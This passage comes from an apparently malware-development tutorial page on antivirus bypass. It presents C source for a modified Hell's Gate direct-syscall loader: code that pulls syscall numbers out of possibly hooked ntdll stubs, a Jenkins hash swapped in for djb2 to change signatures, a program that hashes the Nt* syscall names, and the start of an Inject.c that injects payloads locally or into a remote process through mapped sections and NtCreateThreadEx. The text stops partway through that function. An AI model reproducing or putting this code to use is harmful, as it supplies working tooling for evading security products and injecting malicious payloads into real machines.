	PDWORD pdwAddressOfNames       <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pModuleBase <span class="token operator">+</span> pImageExportDirectory<span class="token operator">-&gt;</span>AddressOfNames<span class="token punctuation">)</span><span class="token punctuation">;</span>
	PWORD pwAddressOfNameOrdinales <span class="token operator">=</span> <span class="token punctuation">(</span>PWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pModuleBase <span class="token operator">+</span> pImageExportDirectory<span class="token operator">-&gt;</span>AddressOfNameOrdinals<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span>WORD cx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> cx <span class="token operator">&lt;</span> pImageExportDirectory<span class="token operator">-&gt;</span>NumberOfNames<span class="token punctuation">;</span> cx<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		PCHAR pczFunctionName  <span class="token operator">=</span> <span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pModuleBase <span class="token operator">+</span> pdwAddressOfNames<span class="token punctuation">[</span>cx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		PVOID pFunctionAddress <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pModuleBase <span class="token operator">+</span> pdwAddressOfFunctions<span class="token punctuation">[</span>pwAddressOfNameOrdinales<span class="token punctuation">[</span>cx<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">djb2</span><span class="token punctuation">(</span>pczFunctionName<span class="token punctuation">)</span> <span class="token operator">==</span> pVxTableEntry<span class="token operator">-&gt;</span>uHash<span class="token punctuation">)</span> <span class="token punctuation">{</span>
			pVxTableEntry<span class="token operator">-&gt;</span>pAddress <span class="token operator">=</span> pFunctionAddress<span class="token punctuation">;</span>

			<span class="token comment">// Quick and dirty fix in case the function has been hooked</span>
			WORD cw <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
			<span class="token keyword">while</span> <span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token comment">// check if syscall, in this case we are too far</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFunctionAddress <span class="token operator">+</span> cw<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x0f</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFunctionAddress <span class="token operator">+</span> cw <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x05</span><span class="token punctuation">)</span>
					<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

				<span class="token comment">// check if ret, in this case we are also probaly too far</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFunctionAddress <span class="token operator">+</span> cw<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xc3</span><span class="token punctuation">)</span>
					<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

				<span class="token comment">// First opcodes should be :</span>
				<span class="token comment">//    MOV R10, RCX</span>
				<span class="token comment">//    MOV EAX, &lt;syscall&gt;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFunctionAddress <span class="token operator">+</span> cw<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x4c</span>
					<span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFunctionAddress <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> cw<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x8b</span>
					<span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFunctionAddress <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> cw<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xd1</span>
					<span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFunctionAddress <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">+</span> cw<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xb8</span>
					<span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFunctionAddress <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">+</span> cw<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x00</span>
					<span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFunctionAddress <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">+</span> cw<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
					BYTE high <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFunctionAddress <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">+</span> cw<span class="token punctuation">)</span><span class="token punctuation">;</span>
					BYTE low <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pFunctionAddress <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">+</span> cw<span class="token punctuation">)</span><span class="token punctuation">;</span>
					pVxTableEntry<span class="token operator">-&gt;</span>wSystemCall <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> low<span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>

				cw<span class="token operator">++</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>pVxTableEntry<span class="token operator">-&gt;</span>wSystemCall <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
	<span class="token keyword">else</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>The code above does not have the <code>VX_TABLE_ENTRY</code> structure or the <code>djb2</code> function defined. To solve this, two new files will be created: <code>WinApi.c</code> and <code>Common.h</code>.</p>
<ul>
<li>
<p><code>WinApi.c</code> - This file is used to store the CRT library 
replacement functions and the string hashing functions used in Hell's 
Gate and the API Hahsing implementation.</p>
</li>
<li>
<p><code>Common.h</code> - This file provides common function prototypes
 to enable calling a function from a different file, as well as custom 
structure definitions, hashes values of the syscalls, and WinAPIs.</p>
</li>
</ul>
<p>The <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L92" target="_blank">djb2</a> string hashing function is replaced with the following <code>HashStringJenkinsOneAtATime32BitA/W</code> functions, hence changing the original string hashing algorithm used in Hell's Gate.</p>
<p><strong>WinApi.c</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"Structs.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"Common.h"</span></span>


UINT32 <span class="token function">HashStringJenkinsOneAtATime32BitA</span><span class="token punctuation">(</span>_In_ PCHAR String<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	SIZE_T Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	UINT32 Hash <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	SIZE_T Length <span class="token operator">=</span> <span class="token function">lstrlenA</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>Index <span class="token operator">!=</span> Length<span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		Hash <span class="token operator">+=</span> String<span class="token punctuation">[</span>Index<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		Hash <span class="token operator">+=</span> Hash <span class="token operator">&lt;&lt;</span> INITIAL_SEED<span class="token punctuation">;</span>
		Hash <span class="token operator">^=</span> Hash <span class="token operator">&gt;&gt;</span> <span class="token number">6</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	Hash <span class="token operator">+=</span> Hash <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span>
	Hash <span class="token operator">^=</span> Hash <span class="token operator">&gt;&gt;</span> <span class="token number">11</span><span class="token punctuation">;</span>
	Hash <span class="token operator">+=</span> Hash <span class="token operator">&lt;&lt;</span> <span class="token number">15</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> Hash<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


UINT32 <span class="token function">HashStringJenkinsOneAtATime32BitW</span><span class="token punctuation">(</span>_In_ PWCHAR String<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	SIZE_T Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	UINT32 Hash <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	SIZE_T Length <span class="token operator">=</span> <span class="token function">lstrlenW</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>Index <span class="token operator">!=</span> Length<span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		Hash <span class="token operator">+=</span> String<span class="token punctuation">[</span>Index<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		Hash <span class="token operator">+=</span> Hash <span class="token operator">&lt;&lt;</span> INITIAL_SEED<span class="token punctuation">;</span>
		Hash <span class="token operator">^=</span> Hash <span class="token operator">&gt;&gt;</span> <span class="token number">6</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	Hash <span class="token operator">+=</span> Hash <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span>
	Hash <span class="token operator">^=</span> Hash <span class="token operator">&gt;&gt;</span> <span class="token number">11</span><span class="token punctuation">;</span>
	Hash <span class="token operator">+=</span> Hash <span class="token operator">&lt;&lt;</span> <span class="token number">15</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> Hash<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p><strong>Common.h</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">once</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>

<span class="token comment">// Seed of the HashStringJenkinsOneAtATime32BitA/W funtion in 'WinApi.c'</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">INITIAL_SEED</span>	<span class="token expression"><span class="token number">8</span></span></span>

UINT32 <span class="token function">HashStringJenkinsOneAtATime32BitW</span><span class="token punctuation">(</span>_In_ PWCHAR String<span class="token punctuation">)</span><span class="token punctuation">;</span>
UINT32 <span class="token function">HashStringJenkinsOneAtATime32BitA</span><span class="token punctuation">(</span>_In_ PCHAR String<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">HASHA</span><span class="token expression"><span class="token punctuation">(</span>API<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">HashStringJenkinsOneAtATime32BitA</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span> API<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">HASHW</span><span class="token expression"><span class="token punctuation">(</span>API<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">HashStringJenkinsOneAtATime32BitW</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PWCHAR<span class="token punctuation">)</span> API<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token comment">// These are function prototypes - functions are defined in 'HellsGate.c'</span>
PTEB <span class="token function">RtlGetThreadEnvironmentBlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
BOOL <span class="token function">GetImageExportDirectory</span><span class="token punctuation">(</span>PVOID pModuleBase<span class="token punctuation">,</span> PIMAGE_EXPORT_DIRECTORY<span class="token operator">*</span> ppImageExportDirectory<span class="token punctuation">)</span><span class="token punctuation">;</span>
BOOL <span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>PVOID pModuleBase<span class="token punctuation">,</span> PIMAGE_EXPORT_DIRECTORY pImageExportDirectory<span class="token punctuation">,</span> PVX_TABLE_ENTRY pVxTableEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// These are functions prototypes - functions are defined in 'HellAsm.asm'</span>
<span class="token keyword">extern</span> VOID <span class="token function">HellsGate</span><span class="token punctuation">(</span>WORD wSystemCall<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">extern</span> <span class="token function">HellDescent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Define the <code>VX_TABLE_ENTRY</code> in the <code>Common.h</code> file, then update the <code>HellsGate.c</code> file to include it and utilize <code>HASHA</code> instead of <code>djb2</code> as the hashing function.</p>
<p><strong>VX_TABLE_ENTRY</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_VX_TABLE_ENTRY</span> <span class="token punctuation">{</span>
	PVOID   pAddress<span class="token punctuation">;</span>
	UINT32	uHash<span class="token punctuation">;</span>
	WORD    wSystemCall<span class="token punctuation">;</span>
<span class="token punctuation">}</span> VX_TABLE_ENTRY<span class="token punctuation">,</span> <span class="token operator">*</span> PVX_TABLE_ENTRY<span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-4">Calculating Syscall Hashes</h3>
<p>A new project must be created in order to calculate the hash values of the syscalls used and print them to the console. The <code>Hasher</code> project will have one C file which is shown below.</p>
<p><strong>Hasher.c</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>


<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">STR</span> <span class="token string">"_JOAA"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">INITIAL_SEED</span> <span class="token expression"><span class="token number">8</span></span></span>


UINT32 <span class="token function">HashStringJenkinsOneAtATime32BitA</span><span class="token punctuation">(</span>_In_ PCHAR String<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	SIZE_T Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	UINT32 Hash <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	SIZE_T Length <span class="token operator">=</span> <span class="token function">lstrlenA</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>Index <span class="token operator">!=</span> Length<span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		Hash <span class="token operator">+=</span> String<span class="token punctuation">[</span>Index<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		Hash <span class="token operator">+=</span> Hash <span class="token operator">&lt;&lt;</span> INITIAL_SEED<span class="token punctuation">;</span>
		Hash <span class="token operator">^=</span> Hash <span class="token operator">&gt;&gt;</span> <span class="token number">6</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	Hash <span class="token operator">+=</span> Hash <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span>
	Hash <span class="token operator">^=</span> Hash <span class="token operator">&gt;&gt;</span> <span class="token number">11</span><span class="token punctuation">;</span>
	Hash <span class="token operator">+=</span> Hash <span class="token operator">&lt;&lt;</span> <span class="token number">15</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> Hash<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


UINT32 <span class="token function">HashStringJenkinsOneAtATime32BitW</span><span class="token punctuation">(</span>_In_ PWCHAR String<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	SIZE_T Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	UINT32 Hash <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	SIZE_T Length <span class="token operator">=</span> <span class="token function">lstrlenW</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>Index <span class="token operator">!=</span> Length<span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		Hash <span class="token operator">+=</span> String<span class="token punctuation">[</span>Index<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		Hash <span class="token operator">+=</span> Hash <span class="token operator">&lt;&lt;</span> INITIAL_SEED<span class="token punctuation">;</span>
		Hash <span class="token operator">^=</span> Hash <span class="token operator">&gt;&gt;</span> <span class="token number">6</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	Hash <span class="token operator">+=</span> Hash <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span>
	Hash <span class="token operator">^=</span> Hash <span class="token operator">&gt;&gt;</span> <span class="token number">11</span><span class="token punctuation">;</span>
	Hash <span class="token operator">+=</span> Hash <span class="token operator">&lt;&lt;</span> <span class="token number">15</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> Hash<span class="token punctuation">;</span>
<span class="token punctuation">}</span>



<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"#define %s%s \t0x%0.8X \n"</span><span class="token punctuation">,</span> <span class="token string">"NtCreateSection"</span><span class="token punctuation">,</span> STR<span class="token punctuation">,</span> <span class="token function">HashStringJenkinsOneAtATime32BitA</span><span class="token punctuation">(</span><span class="token string">"NtCreateSection"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"#define %s%s \t0x%0.8X \n"</span><span class="token punctuation">,</span> <span class="token string">"NtMapViewOfSection"</span><span class="token punctuation">,</span> STR<span class="token punctuation">,</span> <span class="token function">HashStringJenkinsOneAtATime32BitA</span><span class="token punctuation">(</span><span class="token string">"NtMapViewOfSection"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"#define %s%s \t0x%0.8X \n"</span><span class="token punctuation">,</span> <span class="token string">"NtUnmapViewOfSection"</span><span class="token punctuation">,</span> STR<span class="token punctuation">,</span> <span class="token function">HashStringJenkinsOneAtATime32BitA</span><span class="token punctuation">(</span><span class="token string">"NtUnmapViewOfSection"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"#define %s%s \t0x%0.8X \n"</span><span class="token punctuation">,</span> <span class="token string">"NtClose"</span><span class="token punctuation">,</span> STR<span class="token punctuation">,</span> <span class="token function">HashStringJenkinsOneAtATime32BitA</span><span class="token punctuation">(</span><span class="token string">"NtClose"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"#define %s%s \t0x%0.8X \n"</span><span class="token punctuation">,</span> <span class="token string">"NtCreateThreadEx"</span><span class="token punctuation">,</span> STR<span class="token punctuation">,</span> <span class="token function">HashStringJenkinsOneAtATime32BitA</span><span class="token punctuation">(</span><span class="token string">"NtCreateThreadEx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"#define %s%s \t0x%0.8X \n"</span><span class="token punctuation">,</span> <span class="token string">"NtWaitForSingleObject"</span><span class="token punctuation">,</span> STR<span class="token punctuation">,</span> <span class="token function">HashStringJenkinsOneAtATime32BitA</span><span class="token punctuation">(</span><span class="token string">"NtWaitForSingleObject"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-5">Hasher Results</h4>
<p>Once compiled and ran, the program will generate the following results which should be copied to the <code>Common.h</code> file.</p>
<p><img src="81_files/av-bypass-116769871-25449179-cdfb-412b-899f-1744ac77246b.png" alt="image"></p>
<p>Additionally, the new <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L14" target="_blank">VX_TABLE</a> structure definition must be updated to include the syscalls that will be utilized.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_VX_TABLE</span> <span class="token punctuation">{</span>

	VX_TABLE_ENTRY NtCreateSection<span class="token punctuation">;</span>
	VX_TABLE_ENTRY NtMapViewOfSection<span class="token punctuation">;</span>
	VX_TABLE_ENTRY NtUnmapViewOfSection<span class="token punctuation">;</span>
	VX_TABLE_ENTRY NtClose<span class="token punctuation">;</span>
	VX_TABLE_ENTRY NtCreateThreadEx<span class="token punctuation">;</span>
	VX_TABLE_ENTRY NtWaitForSingleObject<span class="token punctuation">;</span>

<span class="token punctuation">}</span> VX_TABLE<span class="token punctuation">,</span> <span class="token operator">*</span> PVX_TABLE<span class="token punctuation">;</span>

</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-6">Payload Injection Via Hell's Gate</h3>
<p>With Hell's Gate successfully set up, the payload injection implementation can be made. A new file will be created, <code>Inject.c</code> which is shown below.</p>
<p>The following points briefly explain the <code>Inject.c</code> file:</p>
<ul>
<li>
<p><code>InitializeSyscalls</code> - This function initializes the global <code>g_Sys</code> variable of type <code>VX_TABLE</code> to be used later on.</p>
</li>
<li>
<p><code>RemoteMappingInjectionViaSyscalls</code> - This function supports both local and remote mapping injection via the <code>bLocal</code> parameter which is set to <code>TRUE</code> to inject the payload locally, or <code>FALSE</code> for remote injection.</p>
<ul>
<li>If the <code>bLocal</code> parameter is set to <code>TRUE</code>, the <code>dwLocalFlag</code> variable will be set to <code>PAGE_EXECUTE_READWRITE</code> to be suitable for local payload execution, and the second <code>NtMapViewOfSection</code> will be avoided. But if <code>bLocal</code> is <code>FALSE</code>, the <code>dwLocalFlag</code> will remain <code>PAGE_READWRITE</code> and the function will run the second <code>NtMapViewOfSection</code> call to allocate memory remotely.</li>
<li>The <code>pExecAddress</code> variable is used to save the base 
address of the injected payload. It is equal to the base address of the 
locally injected payload (<code>pLocalAddress</code>) if the function is set to execute the payload locally, or the remote injected payload base address (<code>pRemoteAddress</code>) if the function is set to execute the payload remotely.</li>
<li>The <code>pExecAddress</code> variable will be then passed to the <code>NtCreateThreadEx</code> syscall to execute the payload whenever it was.</li>
</ul>
</li>
</ul>
<p><strong>Inject.c</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>


<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"Structs.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"Common.h"</span></span>

<span class="token comment">// global `VX_TABLE` structure</span>
VX_TABLE 	g_Sys <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>



BOOL <span class="token function">InitializeSyscalls</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token comment">// Get the PEB</span>
	PTEB pCurrentTeb <span class="token operator">=</span> <span class="token function">RtlGetThreadEnvironmentBlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	PPEB pCurrentPeb <span class="token operator">=</span> pCurrentTeb<span class="token operator">-&gt;</span>ProcessEnvironmentBlock<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pCurrentPeb <span class="token operator">||</span> <span class="token operator">!</span>pCurrentTeb <span class="token operator">||</span> pCurrentPeb<span class="token operator">-&gt;</span>OSMajorVersion <span class="token operator">!=</span> <span class="token number">0xA</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token comment">// Get NTDLL module </span>
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry <span class="token operator">=</span> <span class="token punctuation">(</span>PLDR_DATA_TABLE_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pCurrentPeb<span class="token operator">-&gt;</span>Ldr<span class="token operator">-&gt;</span>InMemoryOrderModuleList<span class="token punctuation">.</span>Flink<span class="token operator">-&gt;</span>Flink <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Get the EAT of NTDLL</span>
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetImageExportDirectory</span><span class="token punctuation">(</span>pLdrDataEntry<span class="token operator">-&gt;</span>DllBase<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pImageExportDirectory<span class="token punctuation">)</span> <span class="token operator">||</span> pImageExportDirectory <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	g_Sys<span class="token punctuation">.</span>NtCreateSection<span class="token punctuation">.</span>uHash       <span class="token operator">=</span> NtCreateSection_JOAA<span class="token punctuation">;</span>
	g_Sys<span class="token punctuation">.</span>NtMapViewOfSection<span class="token punctuation">.</span>uHash    <span class="token operator">=</span> NtMapViewOfSection_JOAA<span class="token punctuation">;</span>
	g_Sys<span class="token punctuation">.</span>NtUnmapViewOfSection<span class="token punctuation">.</span>uHash  <span class="token operator">=</span> NtUnmapViewOfSection_JOAA<span class="token punctuation">;</span>
	g_Sys<span class="token punctuation">.</span>NtClose<span class="token punctuation">.</span>uHash               <span class="token operator">=</span> NtClose_JOAA<span class="token punctuation">;</span>
	g_Sys<span class="token punctuation">.</span>NtCreateThreadEx<span class="token punctuation">.</span>uHash      <span class="token operator">=</span> NtCreateThreadEx_JOAA<span class="token punctuation">;</span>
	g_Sys<span class="token punctuation">.</span>NtWaitForSingleObject<span class="token punctuation">.</span>uHash <span class="token operator">=</span> NtWaitForSingleObject_JOAA<span class="token punctuation">;</span>

	<span class="token comment">// initialize the syscalls</span>
